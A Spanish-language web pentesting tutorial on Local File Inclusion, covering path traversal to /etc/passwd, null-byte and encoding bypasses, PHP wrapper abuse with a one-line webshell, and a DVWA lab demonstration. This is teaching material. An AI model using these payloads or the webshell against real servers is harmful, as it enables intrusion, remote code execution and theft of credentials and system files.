<p align="center">
  <a href="https://github.com/DenverCoder1/readme-typing-svg"><img src="https://readme-typing-svg.herokuapp.com?font=Fira+Code&pause=1000&color=D1F700&width=435&lines=Ataque+de+Local+File+Inclusion+(LFI)"></a>
</p>

<h1 align="center"></h1>

<h3 align="center"><ins>Vulnerabilidad LOCAL FILE INCLUSION</ins></h3>

La vulnerabilidad de inclusión de archivos (LFI) es un ataque en la que los atacantes engañan a una aplicación web para que ejecute o exponga achivos privados en un servidor web. Estos archivos pueden exponer información confidencial y, en casos graves, pueden generar secuencias de comandos entre sitios (<a href="https://github.com/R3LI4NT/articulos/blob/main/Pentesting/WEB/ataqueXSS.md">Cross-Site Scripting</a>) y ejecucción remota de código. LFI figura en el top de las principales vulnerabilidades de aplicaciones web de OWASP. Dependiendo de la gravedad, también puede conducir a:

- Denegación de Servicio (DoS).

- Ejecucción de código del lado del cliente, como JavaScript, que da lugar a ataques XSS.

- Ejecución de código en el servidor web.

- Exposición de información confidencial.

<p align="center">
  <img src="https://github.com/R3LI4NT/articulos/blob/main/Pentesting/WEB/img/esquema_LFI.png">
</p>

</br>

#### ¿Cómo funciona?

Esta vulnerabilidad existe cuando una aplicación web incluye un archivo sin desinfectar correctamente la entrada, lo que permite que un atacante manipule la entra de la URL e inyecte caracteres transversales en la ruta (como **../**) en busca de archivos existentes en el servidor web. Ocasionalmente, ocurre cuando una página recibe, como entrada, la ruta del archivo que debe incluirse y esta entrada no se desinfecta adecuadamente. La mayoría de ejemplos apuntan a scripts PHP vulnerables, aunque también se da en caso de tecnologías como ASP, JSP, entre otras.

La siguiente URL es un ejemplo de cómo un LFI permite a los atacantes extraer información confidencial de un servidor por medio del nombre de un archivo:

```
https://website.com/?module=products.php
```

Un atacante puede modificar la URL para que sea vea así:

```
https://website.com/?module=../../../../etc/passwd
```
Lo que hará aquí el servidor es mostrar el contenido del fichero `/etc/passwd`. El contenido de este fichero determina quien puede acceder al sistema de manera legitima y que se puede hacer dentro del sistema. Se debe ser sumamanete cuidadoso con él, evitar errores y fallos de seguridad que puedan comprometer el sistema a base de accesos no autorizados. El fichero registra todas las cuentas de usuarios, así como las claves y privilegios de las mismas. Si se cumplen las condiciones mencionadas anteriormente, un atacante vería algo como lo siguiente:
```
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
alex:x:500:500:alex:/home/alex:/bin/bash
margo:x:501:501::/home/margo:/bin/bash
```

<p align="center">
  <img src="https://github.com/R3LI4NT/articulos/blob/main/Pentesting/WEB/img/fichero_valores.png">
</p>

- **1)** `Usuario`: Se utiliza cuando el usuario inicia sesión. Debe tener entre 1 y 32 caracteres de longitud.

- **2)** `Contraseña`: El carácter x nos indica que la contraseña cifrada se almacena en el archivo /etc/shadow.

- **3)** `ID de usuario (UID)`: Cada usuario debe tener asignado un ID de usuario (UID). El UID 0 (cero) está reservado para root y los UID 1-99 están reservados para otras cuentas predefinidas. El sistema reserva más UID 100-999 para cuentas/grupos administrativos y del sistema.

- **4)** `ID de grupo (GID)`: Es el ID del grupo principal al que pertenece el usuario (almacenado en el archivo /etc/group).

- **5)** `Información de ID de usuario (GECOS)`: Es el campo de comentarios. Le permite agregar información adicional sobre los usuarios, como el nombre completo del usuario, el número de teléfono, etc.

- **6)** `Directorio de inicio`: La ruta absoluta al directorio en el que estará el usuario cuando inicie sesión. Si este directorio no existe, el directorio de usuarios se convierte en **/**.

- **7)** `Commando/Shell`: Esta es la ruta absoluta del shell (/bin/bash) predeterminado para el inicio de sesión del usuario del sistema GNU/Linux. 


El shell establecido en **/sbin/nologin** indica que deniega el acceso al usuario de iniciar sesión al sistema GNU/Linux.

![1](https://user-images.githubusercontent.com/75953873/192151584-745d2732-fd60-4a63-a68b-ba09a25a83d2.png)

El siguiente fragmento de código es un ejemplo común de una vulnerabilidad LFI:
```php
<?php

$file = $_GET['file'];

if(isset($file))
  include("pages/$file");
  
else
  include("index.php");
  
?>
```

Para explotar este escenario, uno podría simplemente manipular el parámetro del archivo para leer un archivo aleatorio como este:
```
https://website.com?file=../../../../../../etc
```
Si todo tiene éxito, puede comenzar a recupear algunos archivos para obtener información básica sobre el sistema. Lo más utilizados son:
```
- /etc/passwd
- /etc/hostname
- /etc/shadow
- /etc/group
- /etc/resolv.conf
- /etc/crontab
- /etc/mysql/my.cnf 
- /proc/version
- /proc/mounts
- /proc/cmdline
- /proc/self/environ
```

</br>

#### Inyección de Bytes Nulos

La inyección de bytes nulos es una técnica de explotación activa que se utiliza para evadir los filtros de verificación de la infraestructura web al añadir caracteres de bytes nulos codificados en URL (%00 o 0x00 en hexadecimal) a los datos proporcionados por el usuario. Esta técnica se puede utilizar para realizar otros ataques, como la exploración de directorios, el cruce de rutas, la inyección de SQL, la ejecución de código arbitrario, otros. En el caso de LFI, se utiliza como carácter reservado para marcar el final de una cadena. Una vez utilizado, se ignorará cualquier carácter después de este byte especial. Por lo general, la forma de inyectar este carácter sería con la cadena codificada de URL **%00** agregándola a la ruta solicitada, por ejemplo:
```
https://website.com/index.php?file=../../../../etc/passwd%00
```
El ejemplo anterior lo que hace es ignorar la extensión `php` que se agrega al nombre de archivo de entrada, devolviendo una lista de usuarios. Esto nos serviría si el código PHP es similar a lo siguiente:
```php
$module=$_GET['module'];
require($module."/config.php");
```
En el caso de que sea `?module=/etc/hosts%00`, el sistema operativo ignora lo que sigue después del %00.

</br>

#### Codificación

La manipulación de variables que hacen referencia a archivos de secuencias de `../` y sus variaciones, permite eludir el filtrado de entrada mal implementado. Algunos ejemplos son:

|  | URL | URL Doble | Unicódigo UTF-8 | Unicode de 16 bits |
| ------------- | ------------- | ------------- | ------------- | ------------- |
| . | %2e | %252e | %c0%2e %e0%40%ae %c0%ae | %u002e |
| / | %2f | %252f | %c0%2f %e0%80%af %c0%af | %u2215 |
| \ | %2c |%252c | %c0%5c %c0%80%5c | %u2216 |
| ../ | %2e%2e%2f | %252e%252e%252f | %c0%ae%c0%ae%c0%af | %uff0e%uff0e%u2215 |
| ..\ | %2e%2e%2c | %252e%252e%252c | %c0%ae%c0%ae%c0%af | %uff0e%uff0e%u2216 |

URL Doble:
```
https://website.com/index.php?file=%252e%252e%252fetc%252fpasswd
```

Unicódigo UTF-8:
```
https://website.com/index.php?file=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
```

Bypass filtro:
```
https://website.com/index.php?file=..///////..////..//////etc/passwd
```

</br>

#### PHP Wrappers

PHP tiene una serie de envoltorios de los que a menudo se puede abusar para eludir varios filtros de entrada mediante secuencia, petición, entrada y salida de datos.

- **p://filter**: El wrapper `filter` permite encodear el archivo específico, lo que es útil para leer aquellos archivos PHP que el navegador interpretaría directamente. Por ejemplo:
```php
<?php

// Usuario: admin | Contraseña: sUp3rPassw00rd!

echo "Archivo vacio"

?>
```
Como se observa en el código, tiene el usuario y contraseña en un comentario. Pero si iniciamos el servidor y accedieramos al archivo desde el navegador solo vemos la salida del código interpretado:

![2](https://user-images.githubusercontent.com/75953873/192166389-d0d64fea-29f4-4e96-b942-aa17b3c223d8.png)

Sin embargo, usando el wrapper `filter`, seremos capaces de leer el código PHP completo. A modo de ejemplo, he creado un archivo `index.php` vulnerable a LFI. Por lo que, el payload que introduciremos para hacer uso del wrapper y leer el archivo `config.php`, es el siguiente:
```
php://filter/convert.base64-encode/resource=config.php
```
![3](https://user-images.githubusercontent.com/75953873/192179422-945b2f12-43d6-4080-ac60-56d4aaef977b.png)

De esta manera, nos devuelve el contenido del archivo `config.php` pero en base64, por lo que si decodeamos la salida con bash, obtenemos el archivo completo:
```
┌─[root@R3LI4NT]─[/var/www/html]
└──╼ echo 'PD9waHAKCi8vIFVzdWFyaW86IGFkbWluIHwgQ29udHJhc2XDsWE6IHNVcDNyUGFzc3cwMHJkIQoKZWNobyAiQXJjaGl2byB2YWNpbyIKCj8+' | base64 -d
```
![4](https://user-images.githubusercontent.com/75953873/192179580-a54f5df5-366e-4264-b987-e3e1050dbf36.png)

</br>

- **zip://**: El wrapper `zip` permite ejecutar un archivo PHP que se haya metido dentro de un archivo ZIP. El archivo ZIP puede tener cualquier extensión. Se requiere una instalación manual del wrapper:
```
sudo apt-get install php-zip
```
Ejemplo de ejecución de webshell a través del wrapper zip:
```
┌─[root@R3LI4NT]─[/var/www/html]
└──╼ echo '<?php system($_GET['cmd']); ?>' > config.php && zip test.zip config.php
```
![5](https://user-images.githubusercontent.com/75953873/192182298-3633f2a9-f0ef-45cb-8628-bbea956b68f0.png)

En caso de no encontrarse en el directorio actual, se le específica el nombre del directorio donde se encuentra el archivo ZIP. 
```
zip://<archivo-ZIP>%23<archivo-PHP>&cmd=ls
```
![6](https://user-images.githubusercontent.com/75953873/192181785-324d3c04-5127-486f-8472-8487d9d38bcd.png)

El abuso de este envoltorio podría permitir que un atacante diseñe un archivo ZIP malicioso que podría cargarse en el servidor, por ejemplo, como una imagen de avatar o utilizando cualquier sistema de carga de archivos disponible en el sitio web de destino.

</br>

- **data://**: El wrapper `data` permite incluir datos externos, como código PHP. El contenido es de modo lectura o de tipo medio que se puede imprimir más tarde. Este wrapper es funcional si la opción de <a href ="https://www.php.net/manual/en/wrappers.data.php">**allow_url_include**</a> está activada en la configuración de PHP.

Hay dos formas de ejecutar código PHP en este wrapper. La primera, en texto plano:
```
data:text/plain,<código-PHP>
```


Y la segunda en base64, simplemente tendríamos que encodear el código PHP:
```
┌─[root@R3LI4NT]─[/home/whoami/]
└──╼ echo '<?php system($_GET['cmd']); ?>' | base64
```
![8](https://user-images.githubusercontent.com/75953873/192186113-4c3ea0ba-da8a-4ca4-b8a0-3dec7f483184.png)


```
data://text/plain;base64,<código-PHP-base64>
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pgo=
```

De esta forma, estamos definiendo un parámetro para ejecutar comandos, el payload para ejecutar el comando `id` sería:
```
data://text/plain;base64,<código-PHP-base64>/Pgo=&cmd=id
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pgo=&cmd=id
```
![9](https://user-images.githubusercontent.com/75953873/192187280-863ca584-ca23-431e-8de2-fa63bdf63ee8.png)

El parámetro `id` se encarga de imprimir la información de identificación de usuario (UID) y de grupo (GID). Cada UID es único para cada usuario, mientras que el GID puede constar de más de un UID. Con el comando `id -a` se imprime el nombre de usuario y todo el grupo al que pertenece dicho usuario. 

</br>

- **php://input**: Este wrapper es un flujo de solo lectura que le permite leer datos sin procesar del cuerpo de la solicitud. Es parecido al wrapper **data** y también debe tener habilitada la opción de <a href ="https://www.php.net/manual/en/wrappers.data.php">**allow_url_include**</a>.

Se podría ejecutar comandos mandando el código PHP en los datos de una petición POST.
```
curl -s -X POST -d '<código-PHP>' 'http://example.com/index.php?file=php://input'
```

Por ejemplo:
```
┌─[root@R3LI4NT]─[/home/whoami/]
└──╼ curl -s -X POST --data "<?php system('id'); ?>" "http://localhost/index.php?file=php://input"

uid=0(root) gid=0(root) grupos=0(root),4(adm),119(wireshark)121(bluetooth),137(scanner),141(kaboxer)
```
</br>

- **expect://**: Este wrapper da acceso a una PTY (pseudo-teletype), que en UNIX básicamente se refiere a una terminal. Brinda acceso a los procesos stdio, stdout y stderr a través de PTY.
```
expect://<comando>
```

</br>

#### Truncamiento de ruta

El Truncamiento de ruta es otra técnica para conseguir el mismo proposito que Null Byte, es decir, ignora toda la cadena que se sitúe después de la varibale. La mayoría de las instalaciones de PHP limitan los nombres de archivo a 4096 bytes. Si un nombre de archivo es más largo, PHP lo trunca y descarta todos los caracteres adicionales. Sin embargo, los atacantes pueden eliminar la limitación de 4096 bytes de la extensión .php, manipulando el proceso. Cabe decir que está técnica se parcheo en la versión 5.3 de PHP. Para que esto funcione, hace falta una serie de requisitos: el dato que se le pasa a la variable debe empezar con un string, el byte 4096 debe de ser un punto, la ruta que le indiquemos tiene que tener un número de caracteres impar.

El paylaod debe sobrepasar los 4096 bytes:
```
a/../etc/hosts/./././././
```

**/etc/hosts** es equivalente a **/etc/hosts/.** Por ejemplo:
```
http://localhost/index.php?file=a/../../../../../../../../etc/hosts/.
```
![11](https://user-images.githubusercontent.com/75953873/192408160-8c2c6940-4c4e-47c4-886b-8d755c7c2219.png)

El carácter aleatorio (**a**) es necesario al inicio, de lo contrario, no funcionaria:

![12](https://user-images.githubusercontent.com/75953873/192408403-4c6fc20d-6574-4971-ab75-3e1eeba46e07.png)

Es lo mismo colocar una `a` que colocar 5, 7, 11, etc, siempre y cuando sea un número impar. Si quisieramos generar 4096 bytes con shell scripting, lo haríamos con el siguiente comando:
```
┌─[root@R3LI4NT]─[/home/whoami/]
└──╼ for i in {1..2048}; do echo -n '/.'; done
```
![13](https://user-images.githubusercontent.com/75953873/192409612-5c551ab6-71ef-4f06-877a-7f51ae1075c7.png)

<h1 align="center"></h1>

</br>

### Explotar LOCAL FILE INCLUSION 

Como muestra de lo anterior, tomaré uso de la máquina <a href="https://github.com/R3LI4NT/ctf-retos/blob/main/1-%20Maquinas-Easy/Metasploitable_2.md">Metasploitable 2</a> para demostrar como un atacante puede aprovechar esta vulnerabilidad para extraer datos confidenciales. <a href="https://github.com/digininja/DVWA">DVWA</a> (Damn Vulnerable Web Application) es una aplicación web PHP/MySQL vulnerable. Su objetivo es ayudar a los profesionales de seguridad a probar sus habilidades y herramientas en un entorno controlado y legal.

Debajo se encuentran las credenciales.

Usuario: `admin`

Contraseña: `password`

![2](https://user-images.githubusercontent.com/75953873/185831672-11c95a51-51a4-4019-bf77-a0293bad921b.png)

Si nos dirigimos a seguridad de DVWA podemos establecer el nivel del mismo, escogeré el nivel bajo e iré incrementado la dificultad hasta alcanzar la máxima. En la sección de File Inclusion se observa un código simple escrito PHP vulnerable a LFI:

![14](https://user-images.githubusercontent.com/75953873/192421162-5696a1b3-12db-497f-9748-0f93088c294f.png)

Lo único que hay que hacer es identificar y explotar cualquier secuencia de comando por medio de un archivo de un servidor web, por ejemplo:
```
page=/../../../../etc/passwd
```
El archivo `include.php` es manipulado (fuzzing) con el parámetro de ubicación del archivo (**/etc/passwd**), devolviendo el contenido del servidor web:

![15](https://user-images.githubusercontent.com/75953873/192423959-c3297128-2cd0-4e29-a57e-692094509f25.png)

Para obtener información del sistema GNU/Linux que se esta ejecutando detrás, es tan sencillo con probar el siguiente payload LFI:
```
page=../../../../../../proc/version
```
![16](https://user-images.githubusercontent.com/75953873/192423717-5f4245c9-1d17-4d77-8534-9cf6a771761a.png)

Este proceso puede ser automatizado con un pequeño script que programe en Python. Su nombre es <a href="https://github.com/R3LI4NT/LFIscanner">**LFIscanner**</a> y su instalación es sencilla:
```
┌─[root@R3LI4NT]─[/home/whoami/]
└──╼ git clone https://github.com/R3LI4NT/LFIscanner && cd LFIscanner && pip3 install -r requirements.txt
```
Para poner en marcha el script se debe especificar con el parámetro `-t/--target` la URL pero hasta el signo de igual (**=**), seguidamente el archivo donde contendrá los payloads LFI con el parámetro `-p/--payload`, y el último parámetro es opcional si se quiere extraer la información `-e/--extract`. Por ejemplo:
```
┌─[root@R3LI4NT]─[/home/whoami/]
└──╼ python3 LFIscanner.py -t 'http://192.168.25.128/muilliidae/?page=' -p payloads.txt -e
```
![17](https://user-images.githubusercontent.com/75953873/192648166-ea8d6c34-c4ec-48bf-9e70-4c5696f40e36.png)

Burp Suite es una herramienta de pentesting muy útil que sirve para interceptar los datos que enviamos de un cliente a un servidor. Lo primero será configurar un servidor proxy para que registre todo el tráfico que se genere en el navegador web, para ello debemos ejecutar Burp Suite e ir a la pestaña de _Proxy_ **->** _Options_ y verificar si tenemos el proxy como se muestra a continuación:

![18](https://user-images.githubusercontent.com/75953873/186309125-51ad97c3-b823-4825-8bc4-43fb74091e88.png)

Luego en el navegador, por ejemplo Firefox ir a *Preferencias* **->** *Avanzadas* **->** *Proxy de Red* **->** *Configuración* **->** *Configuración Manual del Proxy*

En **Proxy HTTP** escribir `127.0.0.1`, en **Puerto** escribir `8080` y tildar el mismo proxy para todo:

![19](https://user-images.githubusercontent.com/75953873/186309874-aa443078-e385-45dd-bbb0-faca9508e320.png)
